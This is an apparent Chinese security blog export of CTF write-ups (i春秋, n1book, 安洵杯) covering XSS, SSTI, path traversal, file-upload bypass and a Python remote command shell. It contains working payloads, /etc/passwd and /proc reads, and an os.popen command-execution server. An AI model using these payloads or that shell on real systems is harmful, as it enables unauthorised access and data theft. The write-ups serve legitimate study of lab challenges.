    <title>i春秋:Web-时间</title>
    <url>/2021/05/07/i-chun-qiu-web-shi-jian/</url>
    <content><![CDATA[<pre><code>&lt;?php 
header("content-type:text/html;charset=utf-8");
'天下武功唯快不破';
setcookie('token','hello');   
show_source(__FILE__);
if ($_COOKIE['token']=='hello'){      
  $txt = file_get_contents('flag.php');    
  $filename = 'u/'.md5(mt_rand(1,1000)).'.txt'; 
  file_put_contents($filename,$txt);
  sleep(10);
  unlink($filename);
}</code></pre>
<p>访问网站，在10秒里会生成一个目录，flag会写在里面。但是10秒之后这个目录会被删除。首先我们要生成这些些目录，然后拿着这些目录当成字典爆破</p>
<p>十秒后网页就会变成这样：</p>
<p><img src="/2021/05/07/i-chun-qiu-web-shi-jian/7926171694d823f096c0abc383d4f10.png" alt="7926171694d823f096c0abc383d4f10"></p>
<pre><code>import hashlib
import requests
file = open("data.txt",'w+')
for i in range(1,1001):
  m = hashlib.md5()
  m.update(str(i).encode())
  mid = m.hexdigest()
  url = 'u/'+mid+'.txt'
  file.write(url+'\n')
file.close()</code></pre>
<p>生成的data.txt粘贴到御剑配置目录中</p>
<p>十秒内添加url扫描</p>
<p><img src="/2021/05/07/i-chun-qiu-web-shi-jian/71af1f0c098871c29091abff8fc59ce-1620200164109.png" alt="71af1f0c098871c29091abff8fc59ce"></p>
<p><img src="/2021/05/07/i-chun-qiu-web-shi-jian/7258677249d5a299e5280c858e74163-1620200170576.png" alt="7258677249d5a299e5280c858e74163"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>python shell与反弹shell</title>
    <url>/2021/08/08/python-shell-yu-fan-dan-shell/</url>
    <content><![CDATA[<p>正常shell需要先在攻击端开机情况下开启程序,然后攻击端运行程序,才能连接</p>
<p>反弹shell,攻击端是服务端,被攻击端是客户端<br>正常shell,攻击端是客户端,被攻击端是服务端 </p>
<p>反弹shell,先启用服务端,再启用客户端</p>
<p>反弹shell的好处就是:一旦被攻击端开机,立即连接上攻击端(需要攻击端一直运行)</p>
<h3 id="shell："><a href="#shell：" class="headerlink" title="shell："></a>shell：</h3><h4 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket
s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"XX.XX.XX.XX"</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#连接的服务器的ip地址,端口</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    com<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"command:"</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>com<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#发送信息</span>
    d<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">#接受数据的大小</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h4 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> os
s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span>

s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绑定地址和端口#0.0.0.0接收任意客户端ip连接</span>
s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">#调用listen方法开始监听端口，传入的参数为等待连接的最大数量</span>
con<span class="token punctuation">,</span>addr<span class="token operator">=</span>s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#接受一个客户端的连接</span>
<span class="token comment" spellcheck="true">#print(con,addr)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cmd<span class="token operator">=</span>con<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
    command<span class="token operator">=</span>cmd<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> command<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"cd"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>command<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#切换路径</span>
        result<span class="token operator">=</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">#显示路径</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        result<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> result<span class="token punctuation">:</span>
        con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">"OK!"</span><span class="token punctuation">)</span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>《从0到1：CTFer成长之路》:Web-Upload</title>
    <url>/2021/05/17/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-upload/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>i春秋:Web-攻击</title>
    <url>/2021/06/04/i-chun-qiu-web-gong-ji/</url>
    <content><![CDATA[<pre><code> &lt;?php
header("content-type:text/html;charset=utf-8");
show_source(__FILE__);
echo '&lt;pre&gt;';
include('u/ip.php');
include('flag.php');
if (in_array($_SERVER['REMOTE_ADDR'],$ip)){
  die("您的ip已进入系统黑名单");
}
var_dump($ip);

if ($_POST[substr($flag,5,3)]=='attack'){
  echo $flag;
}else if (count($_POST)&gt;0){
  $ip = '$ip[]="'.$_SERVER['REMOTE_ADDR'].'";'.PHP_EOL; 
  file_put_contents('u/ip.php',$ip,FILE_APPEND);
}


echo '&lt;/pre&gt;';

array(0) {
}</code></pre>
<p>经过审计，要求你post传入的参数内容是attack，名字必须和flag从第五位开始往后三位一样才行。而且会检测REMOTE_ADDR，这个东西是没法伪造的，每个人只有一次机会。</p>
<pre><code>import requests
a = "1234567890abcdef"
data = {}
for i in a:
    for j in a:
        for k in a:
            data[i+j+k]="attack"
print(data)
url='http://f5cbfc1ababd4d9bb04abd665fbeeada3d10cb45b099418f.changame.ichunqiu.com/'
r=requests.post(url,data=data)
print(r.text)</code></pre>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>《从0到1：CTFer成长之路》:Web-XSS闯关</title>
    <url>/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/</url>
    <content><![CDATA[<p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/1b8f9194262029569eac25fe2fe0bcd.png" alt="1b8f9194262029569eac25fe2fe0bcd"></p>
<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/e0418b3fd5c7ad3fceeea2e4c06b810.png" alt="e0418b3fd5c7ad3fceeea2e4c06b810"></p>
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/5c5d2b055ebae5b205942ee2992e8f6.png" alt="5c5d2b055ebae5b205942ee2992e8f6"></p>
<p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/c83f511820e7176ac807755a8c70e38.png" alt="c83f511820e7176ac807755a8c70e38"></p>
<pre><code>var username = ‘’;alert('xss');//’;</code></pre>
<p>执行了alert</p>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/8ba7d443774282ea8d3a3fc3b02e0f8.png" alt="8ba7d443774282ea8d3a3fc3b02e0f8"></p>
<p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/5fc4cc6b8c4229b90a8300982c3d9d0.png" alt="5fc4cc6b8c4229b90a8300982c3d9d0"></p>
<p>单引号过滤了那用两个单引号</p>
<pre><code>?username='';alert('xss');//</code></pre>
<h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/5575961a262d9b8a3a4edbdcb07c2aa.png" alt="5575961a262d9b8a3a4edbdcb07c2aa"></p>
<p> 伪链接<br>javascript:alert(1)，浏览器会把javascript后面的那一段内容当做代码，直接在当前页面执行。<br>代码中接收jumpUrl作为跳转url</p>
<p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/c32728d41d44039d18259fd6c54d679.png" alt="c32728d41d44039d18259fd6c54d679"></p>
<p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/8a7efb956bb6903673491c4440755ab.png" alt="8a7efb956bb6903673491c4440755ab"></p>
<h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><pre><code>if(getQueryVariable('autosubmit') !== false){
      var autoForm = document.getElementById('autoForm');
      autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');
      autoForm.submit();
     }else{

     }
  function getQueryVariable(variable)
  {
         var query = window.location.search.substring(1);
         var vars = query.split("&amp;");
         for (var i=0;i&lt;vars.length;i++) {
                 var pair = vars[i].split("=");
                 if(pair[0] == variable){return pair[1];}
         }
         return(false);
  }</code></pre>
<pre><code>if(getQueryVariable('autosubmit') !== false){</code></pre>
<pre><code>autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');</code></pre>
<pre><code>?autosubmit=1&amp;action=javascript:alert('xss')</code></pre>
<p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/9c572777f083d7436d1b86620dcc3e8.png" alt="9c572777f083d7436d1b86620dcc3e8"></p>
<h3 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/a0e9bd5e0f3c3cc909188f4ea275954.png" alt="a0e9bd5e0f3c3cc909188f4ea275954"></p>
<p>AngularJS模板</p>
<p><a href="https://nosec.org/home/detail/4153.html">https://nosec.org/home/detail/4153.html</a></p>
<p>Angular的沙箱逃逸的方法</p>
<p><a href="https://xz.aliyun.com/t/4638">https://xz.aliyun.com/t/4638</a></p>
<pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></pre>
<p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/6321c24a559b806668ac38fd69e126c.png" alt="6321c24a559b806668ac38fd69e126c"></p>
<h3 id="通关"><a href="#通关" class="headerlink" title="通关"></a>通关</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/2d695b34ea95b30bf5bd66088f4c9bc.png" alt="2d695b34ea95b30bf5bd66088f4c9bc"></p>
]]></content>
      <tags>
        <tag>《从0到1：CTFer成长之路》</tag>
      </tags>
  </entry>
  <entry>
    <title>《从0到1：CTFer成长之路》:thinkphp反序列化利用链</title>
    <url>/2021/06/06/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-thinkphp-fan-xu-lie-hua-li-yong-lian/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>《从0到1：CTFer成长之路》</tag>
      </tags>
  </entry>
  <entry>
    <title>《从0到1：CTFer成长之路》:Web-afr_1</title>
    <url>/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/</url>
    <content><![CDATA[<p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/b7901b4aa9628d957db9d6cafe1ed4a.png" alt="b7901b4aa9628d957db9d6cafe1ed4a"></p>
<p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/227ff2db7a1b0c6b3fd4f6d4bc2d656.png" alt="227ff2db7a1b0c6b3fd4f6d4bc2d656"></p>
<pre><code>?p=php://filter/read=convert.base64-encode/resource=flag</code></pre>
<p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/e4b4ff7ef7c1729762137bfe7e85344.png" alt="e4b4ff7ef7c1729762137bfe7e85344"></p>
<p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/cfb6513f5601da38e436d6ef44065bc.png" alt="cfb6513f5601da38e436d6ef44065bc"></p>
<pre><code>n1book{afr_1_solved}</code></pre>
]]></content>
      <tags>
        <tag>《从0到1：CTFer成长之路》</tag>
      </tags>
  </entry>
  <entry>
    <title>《从0到1：CTFer成长之路》:Web-afr_3</title>
    <url>/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/</url>
    <content><![CDATA[<pre><code>article?name=../../../etc/passwd</code></pre>
<p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/dfafa81734822b8a4dead9370465497.png" alt="dfafa81734822b8a4dead9370465497"></p>
<pre><code>article?name=../../../flag</code></pre>
<p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/2c040ca57f1fa6cd98f6903789c6657.png" alt="2c040ca57f1fa6cd98f6903789c6657"></p>
<h4 id="Linux内核源代码情景分析-特殊文件系统-proc-对-proc-self-cwd的访问"><a href="#Linux内核源代码情景分析-特殊文件系统-proc-对-proc-self-cwd的访问" class="headerlink" title="Linux内核源代码情景分析-特殊文件系统/proc-对/proc/self/cwd的访问"></a>Linux内核源代码情景分析-特殊文件系统/proc-对/proc/self/cwd的访问</h4><ol>
<li><p>/proc/sched_debug # 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用</p>
</li>
<li><p>/proc/mounts # 挂载的文件系统列表</p>
</li>
<li><p>/proc/net/arp # arp表，可以获得内网其他机器的地址</p>
</li>
<li><p>/proc/net/route # 路由表信息</p>
</li>
<li><p>/proc/net/tcp and /proc/net/udp # 活动连接的信息</p>
</li>
<li><p>/proc/net/fib_trie # 路由缓存</p>
</li>
<li><p>/proc/version  # 内核版本</p>
</li>
<li><p>/proc/[PID]/cmdline # 可能包含有用的路径信息</p>
</li>
<li><p>/proc/[PID]/environ #  程序运行的环境变量信息，可以用来包含getshell</p>
</li>
<li><p>/proc/[PID]/cwd     # 当前进程的工作目录</p>
</li>
<li><p>/proc/[PID]/fd/[#] # 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</p>
<pre><code>article?name=../../../proc/self/cmdline</code></pre>
</li>
</ol>
<p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/8e57c316434afe29a6b114b857f3fe9.png" alt="8e57c316434afe29a6b114b857f3fe9"></p>
<pre><code>article?name=../../../proc/self/cwd/server.py</code></pre>
<p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/b0ea292d99ec5dca2dcc57cdc384634.png" alt="b0ea292d99ec5dca2dcc57cdc384634"></p>
<p>看到代码了：</p>
<pre><code>#!/usr/bin/python
import os
from flask import (Flask, render_template, request, url_for, redirect, session, render_template_string)
from flask_session import Session

app = Flask(__name__)
execfile('flag.py')#execfile() 函数可以用来执行一个文件。
execfile('key.py')
FLAG = flag
app.secret_key = key @ app.route("/n1page", methods=["GET", "POST"])


def n1page():
    if request.method != "POST":
        return redirect(url_for("index"))
    n1code = request.form.get("n1code") or None
    if n1code is not None: n1code = n1code.replace(".", "").replace("_", "").replace("{", "").replace("}", "")
if "n1code" not in session or session['n1code'] is None: session['n1code'] = n1code
template = None
if session[
    'n1code'] is not None: template = '''&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class="row&gt; &lt;div class="col-md-6 col-md-offset-3 center"&gt; Hello : %s, why you don't look at our &lt;a href='/article?name=article'&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; ''' %
session['n1code']
session['n1code'] = None
return render_template_string(template) @ app.route("/", methods=["GET"])


def index(): return render_template("main.html") @ app.route('/article', methods=['GET'])


def article(): error = 0


if 'name' in request.args:
    page = request.args.get('name') else:
    page = 'article'
if page.find('flag') &gt;= 0: page = 'notallowed.txt'
try:
    template = open('/home/nu11111111l/articles/{}'.format(page)).read() except Exception as e:
    template = e
return render_template('article.html', template=template)
if __name__ == "__main__": app.run(host='0.0.0.0', debug=False)</code></pre>
<pre><code>flag在flag.py(flag被过滤)
flask的appkey在key.py
源码里面存在ssti，前提是可以伪造flask的session</code></pre>
<p>ssti注入：</p>
<pre><code>{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}'</code></pre>
<p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/e5274968efa9a4310fbf7d679dab5ae.png" alt="e5274968efa9a4310fbf7d679dab5ae"></p>
<p>加密后</p>
<p>cookies:</p>
<pre><code>session=.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.X7VhLg.TjoSPMRjbzbRBNeGnJ2EtXbpNCM</code></pre>
<p>flag：</p>
<pre><code>n1book{afr_3_solved}</code></pre>
]]></content>
      <tags>
        <tag>《从0到1：CTFer成长之路》</tag>
      </tags>
  </entry>
  <entry>
    <title>《从0到1：CTFer成长之路》:文件上传</title>
    <url>/2021/06/05/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-wen-jian-shang-chuan/</url>
    <content><![CDATA[<pre><code>&lt;?php
header("Content-Type:text/html; charset=utf-8");
// 每5分钟会清除一次目录下上传的文件
require_once('pclzip.lib.php');

if(!$_FILES){
    show_source(__FILE__);
}else{
    $file = $_FILES['file'];

    if(!$file){
        exit("请勿上传空文件");
    }
    $name = $file['name'];

    $dir = 'upload/';
    $ext = strtolower(substr(strrchr($name, '.'), 1));
    $path = $dir.$name;

    function check_dir($dir){
        $handle = opendir($dir);
        while(($f = readdir($handle)) !== false){
            if(!in_array($f, array('.', '..'))){
                if(is_dir($dir.$f)){
                    check_dir($dir.$f.'/');
                 }else{
                    $ext = strtolower(substr(strrchr($f, '.'), 1));
                    if(!in_array($ext, array('jpg', 'gif', 'png'))){
                        unlink($dir.$f);
                    }
                }

            }
        }
    }

    if(!is_dir($dir)){
        mkdir($dir);
    }

    $temp_dir = $dir.md5(time(). rand(1000,9999));
    if(!is_dir($temp_dir)){
        mkdir($temp_dir);
    }

    if(in_array($ext, array('zip', 'jpg', 'gif', 'png'))){
        if($ext == 'zip'){
            $archive = new PclZip($file['tmp_name']);
            foreach($archive-&gt;listContent() as $value){
                $filename = $value["filename"];
                if(preg_match('/\.php$/', $filename)){
                     exit("压缩包内不允许含有php文件!");
                 }
            }
            if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) {
                check_dir($dir);
                   exit("解压失败");
            }

            check_dir($dir);
            exit('上传成功!');
        }else{
            move_uploaded_file($file['tmp_name'], $temp_dir.'/'.$file['name']);
            check_dir($dir);
            exit('上传成功!');
        }
    }else{
        exit('仅允许上传zip、jpg、gif、png文件!');
    }
}</code></pre>
<p>正则表达式过滤了以.php结尾的文件</p>
<p>仅允许上传zip、jpg、gif、png文件</p>
<p>apache的解析漏洞。即构造xxxx.php.xxx，只要最后的xxx不能被解析，会继续向左解析，因此php可以成功被解析</p>
<pre><code>if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) {
                check_dir($dir);
                   exit("解压失败");
            }</code></pre>
<pre><code>在压缩包解压失败后，会先删除目录下的非法文件后再退出，所以构造特殊压缩包（解压到一伴退出）方法在此处不可用。从代码中可知，check_dir方法只会递归检测upload目录下的所有文件，根据书中内容可知pclzip存在目录穿越问题。如果将解压出的文件穿越到非upload目录，check__dir方法就无法删除该文件。zip压缩包被解压到/upload/随机md5/目录下，所以需要穿越两个目录。
</code></pre>
<p>首先就是下载010 Editor，然后破解，这些可以网上查。<br>然后就是使用了。左上角file，然后new file，打开zip：<br><img src="https://img-blog.csdnimg.cn/20201011142253801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>如果没有下面的那个，需要手动打开：<br><img src="https://img-blog.csdnimg.cn/20201011142334385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这时候我们会看到，命名我的zip里只有一个文件，但是却显示2个：<br><img src="https://img-blog.csdnimg.cn/20201011142403699.png#pic_center" alt="在这里插入图片描述"></p>
<p>这时候，我们需要修改第二个：<img src="https://img-blog.csdnimg.cn/20201011142436547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>注意ushort deFileName…那里，那个20就是你文件名字的长度。<br>然后我们改成要构造的名字：</p>
<p><img src="https://img-blog.csdnimg.cn/20201011142543519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>然后在localhost访问即可</p>
]]></content>
      <tags>
        <tag>《从0到1：CTFer成长之路》</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链安全</title>
    <url>/2021/06/12/qu-kuai-lian-an-quan/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>博客更新三步</title>
    <url>/2020/10/01/bo-ke-geng-xin-san-bu/</url>
    <content><![CDATA[<ol>
<li>在博客根目录下 hexo new post “文章标题”</li>
<li>hexo g</li>
<li>hexo d</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>同时配置Python2/Python3</title>
    <url>/2021/08/04/tong-shi-pei-zhi-python2-python3/</url>
    <content><![CDATA[<p>换了HUAWEI matebook14，只装了编程用的Python3.9但是githack/git_extract需要用到Python2非常让人抓狂所以又装了Python2.7</p>
<p>下载安装在d盘下</p>
<p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004059992.png" alt="image-20210805004059992"></p>
<h2 id="配置环境变量中的path"><a href="#配置环境变量中的path" class="headerlink" title="配置环境变量中的path"></a>配置环境变量中的path</h2><p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004335592.png" alt="image-20210805004335592"></p>
<h2 id="为了区分python2和python3，改名："><a href="#为了区分python2和python3，改名：" class="headerlink" title="为了区分python2和python3，改名："></a>为了区分python2和python3，改名：</h2><p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004631713.png" alt="image-20210805004631713"><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004650820.png" alt="image-20210805004650820"></p>
<p>cmd中输入python2/python3表明安装成功</p>
<p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004442483.png" alt="image-20210805004442483"></p>
<pre><code>python2 git_extract.py http://0a320780-d474-4e1a-ba8b-126ce07855c9.node4.buuoj.cn:81/.git/</code></pre>
<p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004541769.png" alt="image-20210805004541769"></p>
<h2 id="最后：解决两者pip的共存问题"><a href="#最后：解决两者pip的共存问题" class="headerlink" title="最后：解决两者pip的共存问题"></a>最后：解决两者pip的共存问题</h2><pre><code>python2 -m pip install --upgrade pip --force-reinstall</code></pre>
<pre><code>python3 -m pip install --upgrade pip --force-reinstall </code></pre>
<p><img src="/2021/08/04/tong-shi-pei-zhi-python2-python3/image-20210805004837130.png" alt="image-20210805004837130"></p>
]]></content>
      <tags>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯:2019-EasySerializePhp</title>
    <url>/2021/07/09/an-xun-bei-2019-easyserializephp/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>

<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>

<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
